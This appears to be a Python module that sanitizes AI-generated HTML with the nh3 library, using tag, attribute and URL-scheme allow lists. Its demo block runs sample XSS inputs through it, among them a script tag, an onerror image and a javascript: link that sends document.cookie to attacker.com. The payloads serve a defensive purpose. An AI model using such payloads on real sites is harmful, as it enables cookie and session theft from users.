import nh3 # <1>

class LLMSanitizer:
    BASIC_TAGS = {
        'b', 'i', 'u', 'em', 'strong', 'code', 'pre', 'p', 'br', 
        'span', 'ul', 'ol', 'li'
    }

    RICH_TAGS = BASIC_TAGS | {
        'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
        'a', 'img', 'blockquote',
        'table', 'thead', 'tbody', 'tfoot', 'tr', 'th', 'td',
        'details', 'summary', 'hr'
    }

    ALLOWED_ATTRIBUTES = { # <2>
        'a': {'href', 'title', 'target', 'name'},
        'img': {'src', 'alt', 'title', 'width', 'height', 'align'},
        'code': {'class'},
        'pre': {'class'},
        'span': {'class'},
        'th': {'colspan', 'rowspan', 'scope'},
        'td': {'colspan', 'rowspan'},
    }

    # Explicitly block 'javascript', 'vbscript', 'data', etc.
    ALLOWED_SCHEMES = {'http', 'https', 'mailto', 'tel'} # <3>

    @classmethod
    def clean_output(cls, content: str, mode: str = 'rich') -> str:
        if not content:
            return ""

        tags = cls.RICH_TAGS if mode == 'rich' else cls.BASIC_TAGS
        
        attributes = cls.ALLOWED_ATTRIBUTES if mode == 'rich' else {}

        try:
            cleaned_html = nh3.clean( # <4>
                content,
                tags=tags,
                attributes=attributes,
                url_schemes=cls.ALLOWED_SCHEMES, 
                link_rel="noopener noreferrer",
                strip_comments=True,
            )
            return cleaned_html
        
        except Exception as e:
            # Fallback: In case of nh3 internal error, log and return safe plain text
            print(f"Sanitization failed: {e}")
            return nh3.clean(content, tags=set()) # Return text only, no HTML <5>

if __name__ == "__main__":
    
    llm_article = """
    <h2>Introduction to Security</h2>
    <p>This is a <a href="https://example.com" target="_blank">safe link</a>.</p>
    <blockquote>AI generated content needs boundaries.</blockquote>
    """
    
    print(LLMSanitizer.clean_output(llm_article, mode='rich'))

    xss_attempt = """
    <p>Hello User!</p>
    <script>alert('Stealing tokens...');</script>
    <img src="x" onerror="alert('XSS via attribute')">
    """
    
    print(LLMSanitizer.clean_output(xss_attempt, mode='rich'))

    protocol_attack = """
    <a href="javascript:document.location='http://attacker.com?cookie='+document.cookie">
        Click here for a prize!
    </a>
    """

    print("\n--- 3. Protocol Attack Neutralized ---")
    # Note: nh3 removes the href attribute entirely if the scheme is invalid
    print(LLMSanitizer.clean_output(protocol_attack, mode='rich'))

    complex_html = """
    <h1>Big Header</h1>
    <img src="image.png" />
    <p>Simple text.</p>
    """
    
    print("\n--- 4. Strict Mode (Text Only) ---")
    print(LLMSanitizer.clean_output(complex_html, mode='strict'))